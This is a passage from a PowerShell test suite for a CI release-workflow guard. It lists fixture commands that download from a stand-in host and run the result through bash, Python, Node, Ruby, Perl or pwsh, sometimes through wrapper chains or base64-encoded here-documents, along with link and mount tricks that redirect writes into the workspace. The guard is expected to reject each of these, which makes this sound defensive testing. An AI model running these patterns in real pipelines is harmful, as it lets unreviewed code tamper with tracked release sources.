        @{ Name = 'wget append log outside workspace with response to stdout'; Text = 'wget --append-output "${{ runner.temp }}/wget.log" -O - https://host/payload'; Shell = 'bash' },
        @{ Name = 'Invoke-WebRequest response outside workspace'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile "${{ runner.temp }}/payload.txt"'; Shell = 'pwsh' },
        @{ Name = 'Invoke-WebRequest abbreviated OutFile outside workspace'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFi "${{ runner.temp }}/payload.txt"'; Shell = 'pwsh' },
        @{ Name = 'module-qualified response outside workspace'; Text = 'Microsoft.PowerShell.Utility\Invoke-WebRequest -Uri https://host/payload -OutFile "${{ runner.temp }}/payload.txt"'; Shell = 'pwsh' },
        @{ Name = 'Invoke-RestMethod response outside workspace'; Text = 'Invoke-RestMethod -Uri https://host/payload -OutFile "${{ runner.temp }}/payload.txt"'; Shell = 'pwsh' },
        @{ Name = 'GNU time output outside workspace'; Text = ('time -o "' + $runnerTempSpacedExpression + '/time.log" printf payload'); Shell = 'bash' },
        @{ Name = 'GNU time attached output outside workspace'; Text = ('time -o' + $runnerTempExpression + '/time.log printf payload'); Shell = 'bash' },
        @{ Name = 'GNU time equals output outside workspace'; Text = ('time --output=' + $runnerTempExpression + '/time.log printf payload'); Shell = 'bash' },
        @{ Name = 'curl response to stdout'; Text = 'curl -o - https://host/payload'; Shell = 'bash' },
        @{ Name = 'Invoke-WebRequest response without OutFile'; Text = 'Invoke-WebRequest -Uri https://host/payload'; Shell = 'pwsh' }
    )
    foreach ($case in $safeExternalWriteCases) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @($case)
        $result = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'safe-external-write.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('safe-external-write.yml/future-consumer'))
        if ($result.Count -ne 1 -or $result[0].Scripts -notcontains $script) {
            throw "File write '$($case.Name)' to a destination under runner.temp must preserve pinned workspace source."
        }
    }

    $runnerTempRedirectCases = @(
        @{ Name = 'POSIX symlink to workspace root and root write'; Link = 'ln -s "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'; Write = 'curl --output "${{ runner.temp }}/escape/CHANGELOG.md" https://host/payload'; Shell = 'bash' },
        @{ Name = 'POSIX symlink to nested tree and nested write'; Link = 'ln -s "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"'; Write = 'cp source "${{ runner.temp }}/escape/README.md"'; Shell = 'bash' },
        @{ Name = 'POSIX hard link to tracked root file'; Link = 'ln "$GITHUB_WORKSPACE/CHANGELOG.md" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape"'; Shell = 'bash' },
        @{ Name = 'POSIX hard link through cp --link'; Link = 'cp --link "$GITHUB_WORKSPACE/CHANGELOG.md" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape"'; Shell = 'bash' },
        @{ Name = 'POSIX hard link through bundled cp option'; Link = 'cp -al "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape/CHANGELOG.md"'; Shell = 'bash' },
        @{ Name = 'POSIX bind mount into runner temp'; Link = 'mount -o bind "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape/CHANGELOG.md"'; Shell = 'bash' },
        @{ Name = 'Windows junction to workspace root and root write'; Link = 'New-Item -ItemType Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'; Write = 'Invoke-WebRequest -Uri https://host/payload -OutFile "${{ runner.temp }}\escape\CHANGELOG.md"'; Shell = 'pwsh' },
        @{ Name = 'Windows symbolic link to nested tree and nested write'; Link = 'New-Item -ItemType SymbolicLink -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE\src\KeelMatrix.PackageSurface.Cli"'; Write = 'Copy-Item source "${{ runner.temp }}\escape\README.md"'; Shell = 'pwsh' },
        @{ Name = 'Windows abbreviated Junction parameter'; Link = 'New-Item -I Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'; Write = 'Copy-Item source "${{ runner.temp }}\escape\CHANGELOG.md"'; Shell = 'pwsh' },
        @{ Name = 'Windows aliased dynamic hard-link parameter'; Link = 'ni -Ty:$env:LINK_TYPE -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE\CHANGELOG.md"'; Write = 'Copy-Item source "${{ runner.temp }}\escape"'; Shell = 'pwsh' },
        @{ Name = 'Windows hard link through fsutil'; Link = 'fsutil hardlink create "$env:RUNNER_TEMP\escape" "$env:GITHUB_WORKSPACE\CHANGELOG.md"'; Write = 'Set-Content -Path "${{ runner.temp }}\escape" -Value payload'; Shell = 'pwsh' },
        @{ Name = 'Windows reparse link created through cmd'; Link = 'cmd /c mklink /J "%RUNNER_TEMP%\escape" "%GITHUB_WORKSPACE%"'; Write = 'curl --output "${{ runner.temp }}\escape\CHANGELOG.md" https://host/payload'; Shell = 'pwsh' },
        @{ Name = 'PowerShell dynamic reparse type into runner temp'; Link = 'New-Item -ItemType $env:LINK_TYPE -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'; Write = 'Copy-Item source "${{ runner.temp }}\escape\src\KeelMatrix.PackageSurface.Cli\README.md"'; Shell = 'pwsh' }
    )
    foreach ($case in $runnerTempRedirectCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Link -WriteText $case.Write -Shell $case.Shell -Position $position
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'runner-temp-redirect.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position after a pinned checkout." }
        }
    }

    $newline = [Environment]::NewLine
    $workflowRunnerTemp = ([char]36).ToString() + '{{ runner.temp }}'
    $fooExpansion = ([char]36).ToString() + '{FOO}'
    $escapedFooExpansion = [char]92 + $fooExpansion
    $wrapperExpansion = ([char]36).ToString() + '{WRAPPERS}'
    $helperExpansion = ([char]36).ToString() + '{helper}'
    $encodedRootCurl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('curl --output CHANGELOG.md https://host/payload'))
    $encodedNestedCurl = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'))
    $hiddenInterpreterCases = @(
        @{ Name = 'Bash stdin pipeline hides root curl writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | bash -s"; Shell = 'bash' },
        @{ Name = 'Bash stdin pipeline hides nested curl writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | bash -s"; Shell = 'bash' },
        @{ Name = 'env wrapper hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env bash -s"; Shell = 'bash' },
        @{ Name = 'env option separator hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env -- bash -s"; Shell = 'bash' },
        @{ Name = 'env split-string hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | env -S 'bash -s'"; Shell = 'bash' },
        @{ Name = 'timeout wrapper hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | timeout 2 bash -s"; Shell = 'bash' },
        @{ Name = 'GNU gtimeout hides root Bash stdin writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | gtimeout -- 1 bash -s"; Shell = 'bash' },
        @{ Name = 'GNU gtimeout hides nested Bash stdin writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | gtimeout -- 1 bash -s"; Shell = 'bash' },
        @{ Name = 'absolute GNU gtimeout hides Bash stdin execution'; Text = 'printf x | /opt/homebrew/bin/gtimeout -- 1 /bin/bash -s'; Shell = 'bash' },
        @{ Name = 'qualified GNU gtimeout hides Bash stdin execution'; Text = 'printf x | ./tools/bin/gtimeout -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'quoted Windows GNU gtimeout executable hides Bash stdin execution'; Text = 'printf x | ''C:\Program Files\Git\usr\bin\gtimeout.exe'' -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout consumes separate kill and signal values'; Text = 'printf x | gtimeout -k 1 -s TERM -- 2 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout consumes attached kill and signal values'; Text = 'printf x | gtimeout -k1 -sTERM -- 2 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout consumes equals kill and signal values'; Text = 'printf x | gtimeout --kill-after=1 --signal=TERM 2 bash -s'; Shell = 'bash' },
        @{ Name = 'env separator wraps qualified GNU gtimeout'; Text = 'printf x | env -u SAFE_VALUE -- /usr/local/bin/gtimeout --signal TERM -- 1 /bin/bash -s'; Shell = 'bash' },
        @{ Name = 'env split-string wraps GNU gtimeout options'; Text = "printf x | env -S 'gtimeout --kill-after=1 -- 2 bash -s'"; Shell = 'bash' },
        @{ Name = 'exec argv-zero wraps GNU gtimeout'; Text = 'printf x | exec -a alias gtimeout -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU time output option wraps GNU gtimeout'; Text = ('printf x | time -o "' + $workflowRunnerTemp + '/timing.txt" /opt/homebrew/bin/gtimeout -- 1 bash -s'); Shell = 'bash' },
        @{ Name = 'timeout end-of-options hides root Bash stdin writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | timeout -- 1 bash -s"; Shell = 'bash' },
        @{ Name = 'timeout end-of-options hides nested Bash stdin writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | timeout -- 1 bash -s"; Shell = 'bash' },
        @{ Name = 'timeout end-of-options with duration forms hides Bash stdin'; Text = 'printf x | timeout -- 1.5s bash -s'; Shell = 'bash' },
        @{ Name = 'timeout end-of-options with zero duration hides Bash stdin'; Text = 'printf x | timeout -- 0 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout end-of-options with dynamic duration hides Bash stdin'; Text = 'printf x | timeout -- "$TIMEOUT" bash -s'; Shell = 'bash' },
        @{ Name = 'timeout separate short option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout -k 1 -s TERM -- 2 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout attached short option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout -k1 -sTERM -- 2 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout separate long option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout --kill-after 1 --signal TERM -- 2 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout equals long option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout --kill-after=1 --signal=TERM -- 2 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout end-of-options hides absolute Bash stdin'; Text = 'printf x | timeout -- 1 /bin/bash -s'; Shell = 'bash' },
        @{ Name = 'env separator wraps timeout end-of-options and Bash stdin'; Text = 'printf x | env -u SAFE_VALUE -- timeout -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'env split-string wraps timeout end-of-options and Bash stdin'; Text = "printf x | env -S 'timeout -- 1 bash -s'"; Shell = 'bash' },
        @{ Name = 'exec argv-zero wraps timeout end-of-options and Bash stdin'; Text = 'printf x | exec -a alias timeout -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU time output option wraps timeout end-of-options and Bash stdin'; Text = ('printf x | time -o "' + $workflowRunnerTemp + '/timing.txt" timeout -- 1 bash -s'); Shell = 'bash' },
        @{ Name = 'timeout end-of-options hides downloaded Bash script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
        @{ Name = 'GNU gtimeout runs a downloaded Bash script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
        @{ Name = 'qualified GNU gtimeout runs a downloaded Bash script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; env -u SAFE_VALUE -- /opt/homebrew/bin/gtimeout --kill-after=1 --signal TERM -- 2 bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
        @{ Name = 'GNU gtimeout runs a downloaded PowerShell script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite-source.ps1" https://host/payload; gtimeout -- 1 pwsh -File "' + $workflowRunnerTemp + '/rewrite-source.ps1"'); Shell = 'bash' },
        @{ Name = 'timeout end-of-options hides downloaded PowerShell script'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\rewrite-source.ps1"; timeout -- 1 pwsh -File "' + $workflowRunnerTemp + '\rewrite-source.ps1"'); Shell = 'pwsh' },
        @{ Name = 'wrapper chain and option arguments hide Bash stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | env -u SAFE_VALUE -- timeout --signal=TERM 2 bash -s"; Shell = 'bash' },
        @{ Name = 'env split-string wraps timeout and Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env -S 'timeout 2 bash -s'"; Shell = 'bash' },
        @{ Name = 'exec argv-zero option hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | exec -a alias bash -s"; Shell = 'bash' },
        @{ Name = 'exec attached argv-zero option hides nested Bash stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | exec -aalias bash -s"; Shell = 'bash' },
        @{ Name = 'exec combined flags and argv-zero option hide Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | exec -cla alias bash -s"; Shell = 'bash' },
        @{ Name = 'GNU time output option hides Bash stdin execution'; Text = ('printf x | /usr/bin/time -o "' + $workflowRunnerTemp + '/timing.txt" bash -s'); Shell = 'bash' },
        @{ Name = 'GNU time attached output option hides Bash stdin execution'; Text = ('printf x | time -o' + $workflowRunnerTemp + '/timing.txt bash -s'); Shell = 'bash' },
        @{ Name = 'GNU time equals output option hides nested Bash stdin execution'; Text = ('printf x | time --output=' + $workflowRunnerTemp + '/timing.txt bash -s'); Shell = 'bash' },
        @{ Name = 'GNU time output option wraps timeout and Bash stdin execution'; Text = ('printf x | time --output "' + $workflowRunnerTemp + '/timing.txt" timeout --kill-after=1 --signal=TERM 1 bash -s'); Shell = 'bash' },
        @{ Name = 'GNU time format option hides Bash stdin execution'; Text = "printf x | time -f '%e' bash -s"; Shell = 'bash' },
        @{ Name = 'GNU time equals format option hides Bash stdin execution'; Text = 'printf x | time --format=%e bash -s'; Shell = 'bash' },
        @{ Name = 'timeout kill and signal options with separate values hide Bash stdin execution'; Text = 'printf x | timeout -k 1 -s TERM 2 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout kill and signal options with attached values hide Bash stdin execution'; Text = 'printf x | timeout -k1 -sTERM 2 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout long options with equals values hide Bash stdin execution'; Text = 'printf x | timeout --kill-after=1 --signal=TERM 2 bash -s'; Shell = 'bash' },
        @{ Name = 'env split-string expands an inherited interpreter name'; Text = ('printf x | env -S ''' + $fooExpansion + ' -s'''); Shell = 'bash' },
        @{ Name = 'env split-string expands an inline assigned interpreter name'; Text = ('printf x | FOO=bash env -S ''' + $fooExpansion + ' -s'''); Shell = 'bash' },
        @{ Name = 'env long split-string expands an inherited interpreter name'; Text = ('printf x | env --split-string ''' + $fooExpansion + ' -s'''); Shell = 'bash' },
        @{ Name = 'env attached split-string expands an interpreter name'; Text = ('printf x | env -S=' + $fooExpansion); Shell = 'bash' },
        @{ Name = 'env concatenated split-string expands an interpreter name'; Text = ('printf x | env -S' + $fooExpansion); Shell = 'bash' },
        @{ Name = 'env equals split-string expands an interpreter name'; Text = ('printf x | env --split-string=' + $fooExpansion); Shell = 'bash' },
        @{ Name = 'env split-string retains expansion through inner quotes'; Text = ('printf x | env -S ''"' + $fooExpansion + '" -s'''); Shell = 'bash' },
        @{ Name = 'env split-string retains escaped expansion syntax'; Text = ('printf x | env -S ''' + $escapedFooExpansion + ' -s'''); Shell = 'bash' },
        @{ Name = 'env split-string expansion can produce a wrapper chain'; Text = ('printf x | env -S ''' + $wrapperExpansion + ' bash -s'''); Shell = 'bash' },
        @{ Name = 'sudo and nice option chains hide Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | sudo -u runner -- nice -n 4 bash -s"; Shell = 'bash' },
        @{ Name = 'Bash verbose option still executes stdin'; Text = 'bash -v'; Shell = 'bash' },
        @{ Name = 'env split-string hides Bash verbose stdin execution'; Text = "env -S 'bash -v'"; Shell = 'bash' },
        @{ Name = 'Absolute Bash path hides nested stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | /bin/bash -s"; Shell = 'bash' },
        @{ Name = 'Quoted absolute PowerShell path loads an external script'; Text = ('& ''C:\Program Files\PowerShell\7\pwsh.exe'' -File "' + $workflowRunnerTemp + '\rewrite-source.ps1"'); Shell = 'pwsh' },
        @{ Name = 'Command substitution hides a Bash stdin execution'; Text = 'payload=$(bash -s)'; Shell = 'bash' },
        @{ Name = 'Dash bare interpreter reads piped root writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | dash"; Shell = 'bash' },
        @{ Name = 'Zsh stdin option reads nested writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | zsh -s"; Shell = 'bash' },
        @{ Name = 'Bash here-document feeds a hidden root writer to stdin'; Text = ("base64 -d <<'PAYLOAD' | bash" + $newline + $encodedRootCurl + $newline + 'PAYLOAD'); Shell = 'bash' },
        @{ Name = 'Bash here-document feeds a hidden nested writer to stdin'; Text = ("base64 -d <<'PAYLOAD' | bash" + $newline + $encodedNestedCurl + $newline + 'PAYLOAD'); Shell = 'bash' },
        @{ Name = 'Python stdin pipeline loads root writer code'; Text = 'printf ''%s\n'' ''open("CHANGELOG.md", "w").write("payload")'' | python -'; Shell = 'bash' },
        @{ Name = 'Python stdin device loads nested writer code'; Text = 'python /dev/stdin'; Shell = 'bash' },
        @{ Name = 'Node stdin here-document loads nested writer code'; Text = ("node - <<'NODE'" + $newline + 'require("fs").writeFileSync("src/KeelMatrix.PackageSurface.Cli/README.md", "payload")' + $newline + 'NODE'); Shell = 'bash' },
        @{ Name = 'Ruby stdin here-document loads root writer code'; Text = ("ruby - <<'RUBY'" + $newline + 'File.write("CHANGELOG.md", "payload")' + $newline + 'RUBY'); Shell = 'bash' },
        @{ Name = 'Perl stdin pipeline loads nested writer code'; Text = 'printf ''%s\n'' ''open(F, ">", "src/KeelMatrix.PackageSurface.Cli/README.md"); print F "payload";'' | perl -'; Shell = 'bash' },
        @{ Name = 'Bash executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
        @{ Name = 'Python executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.py" https://host/payload; python "' + $workflowRunnerTemp + '/rewrite.py"'); Shell = 'bash' },
        @{ Name = 'Node executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.js" https://host/payload; node "' + $workflowRunnerTemp + '/rewrite.js"'); Shell = 'bash' },
        @{ Name = 'Ruby executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.rb" https://host/payload; ruby "' + $workflowRunnerTemp + '/rewrite.rb"'); Shell = 'bash' },
        @{ Name = 'Perl executes an external runner-temp script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.pl" https://host/payload; perl "' + $workflowRunnerTemp + '/rewrite.pl"'); Shell = 'bash' },
        @{ Name = 'PowerShell -File executes an external runner-temp script'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\rewrite-source.ps1"; pwsh -File "' + $workflowRunnerTemp + '\rewrite-source.ps1"'); Shell = 'pwsh' },
        @{ Name = 'PowerShell -File reads a script from stdin'; Text = 'pwsh -File -'; Shell = 'pwsh' },
        @{ Name = 'Unquoted PowerShell executable argument runs an external script'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\rewrite-source.ps1"; pwsh $env:RUNNER_TEMP\rewrite-source.ps1'); Shell = 'pwsh' },
        @{ Name = 'Unquoted PowerShell command runs an external script'; Text = '$env:RUNNER_TEMP\rewrite-source.ps1'; Shell = 'pwsh' },
        @{ Name = 'PowerShell dot-source loads an external script'; Text = '. $env:RUNNER_TEMP\rewrite-source.ps1'; Shell = 'pwsh' },
        @{ Name = 'PowerShell call operator runs an external script path'; Text = '& $env:RUNNER_TEMP\rewrite-source.ps1'; Shell = 'pwsh' }
    )
    foreach ($depth in @(14, 15, 16, 17)) {
        $timeoutChain = 'timeout 1 ' * $depth
        $hiddenInterpreterCases += @{
            Name = "Bash stdin wrapper chain at timeout depth $depth"
            Text = ("printf x | " + $timeoutChain + 'bash -s')
            Shell = 'bash'
        }
        $timeoutTerminatorChain = 'timeout -- 1 ' * $depth
        $hiddenInterpreterCases += @{
            Name = "Bash stdin wrapper chain with timeout end-of-options at depth $depth"
            Text = ("printf x | " + $timeoutTerminatorChain + 'bash -s')
            Shell = 'bash'
        }
    }
    foreach ($case in $hiddenInterpreterCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $runStep = @{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell }
            $fixtureArguments = @{ ScriptPath = $script }
            if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($runStep) }
            elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
            else {
                $fixtureArguments.SecondInvocation = $true
                $fixtureArguments.RunsBetweenInvocations = @($runStep)
            }
            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-interpreter.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
        }
    }

    $safeTimeoutCases = @(
        @{ Name = 'timeout end-of-options preserves a tracked PowerShell script'; Text = 'timeout -- 1 pwsh -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
        @{ Name = 'timeout option values preserve a tracked Bash script'; Text = 'timeout -k 1 -- 2 bash ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
        @{ Name = 'timeout end-of-options preserves ordinary runner-temp output'; Text = ('timeout -- 1 printf payload > "' + $workflowRunnerTemp + '/timeout-output.txt"'); Shell = 'bash' },
        @{ Name = 'GNU gtimeout preserves a tracked PowerShell script'; Text = '/opt/homebrew/bin/gtimeout -k 1 -- 2 pwsh -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout preserves ordinary runner-temp output'; Text = ('gtimeout -- 1 printf payload > "' + $workflowRunnerTemp + '/gtimeout-output.txt"'); Shell = 'bash' }
    )
    foreach ($case in $safeTimeoutCases) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
        $result = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'safe-timeout-wrapper.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('safe-timeout-wrapper.yml/future-consumer'))
        if ($result.Count -ne 1 -or $result[0].Scripts -notcontains $script) { throw "Workflow contract rejected $($case.Name)." }
    }

    $incompleteTimeoutCases = @(
        @{ Name = 'timeout end-of-options without a duration'; Text = 'timeout --'; Shell = 'bash' },
        @{ Name = 'timeout duration without a command'; Text = 'timeout -- 1'; Shell = 'bash' },
        @{ Name = 'timeout required short option value is missing'; Text = 'timeout -k'; Shell = 'bash' },
        @{ Name = 'timeout required option value is an option terminator'; Text = 'timeout -k -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout required long option value is empty'; Text = 'timeout --kill-after= -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout duration after terminator looks like an option'; Text = 'timeout -- -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'timeout unknown option fails closed'; Text = 'timeout --unknown-option 1 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout end-of-options without a duration'; Text = 'gtimeout --'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout duration without a command'; Text = 'gtimeout -- 1'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout required short option value is missing'; Text = 'gtimeout -k -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout required long option value is empty'; Text = 'gtimeout --signal= -- 1 bash -s'; Shell = 'bash' },
        @{ Name = 'GNU gtimeout unknown option fails closed'; Text = 'gtimeout --unknown-option 1 bash -s'; Shell = 'bash' }
    )
    foreach ($case in $incompleteTimeoutCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $runStep = @{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell }
            $fixtureArguments = @{ ScriptPath = $script }
            if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($runStep) }
            elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
            else { $fixtureArguments.SecondInvocation = $true; $fixtureArguments.RunsBetweenInvocations = @($runStep) }
            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'incomplete-timeout-wrapper.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
        }
    }

    $indentedHiddenCommands = @(
        @{ Name = 'indented Bash dot-source reads an external script'; Text = ('    . "' + $workflowRunnerTemp + '/prepare.sh"' + $newline + '      :') ; Shell = 'bash' },
        @{ Name = 'indented Bash source reads an external script'; Text = ('      source "' + $workflowRunnerTemp + '/prepare.sh"' + $newline + '        :'); Shell = 'bash' },
        @{ Name = 'indented PowerShell dot-source reads an external script'; Text = ('. "' + $workflowRunnerTemp + '\prepare.ps1"' + $newline + '    '); Shell = 'pwsh' },
        @{ Name = 'indented PowerShell script invocation reads an external script'; Text = ('    & "' + $workflowRunnerTemp + '\prepare.ps1"' + $newline + '      '); Shell = 'pwsh' }
    )
    foreach ($case in $indentedHiddenCommands) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'indented-hidden-command.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name) in an indentation-preserving block scalar." }
    }

    $directExecutableWriterCases = @(
        @{ Name = 'downloaded executable writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; "' + $workflowRunnerTemp + '/rewrite" CHANGELOG.md'); Shell = 'bash' },
        @{ Name = 'downloaded executable writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; "' + $workflowRunnerTemp + '/rewrite" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
        @{ Name = 'timeout end-of-options runs downloaded script that writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md'); Shell = 'bash' },
        @{ Name = 'timeout end-of-options runs downloaded script that writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
        @{ Name = 'GNU gtimeout runs downloaded script that writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md'); Shell = 'bash' },
        @{ Name = 'GNU gtimeout runs downloaded script that writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
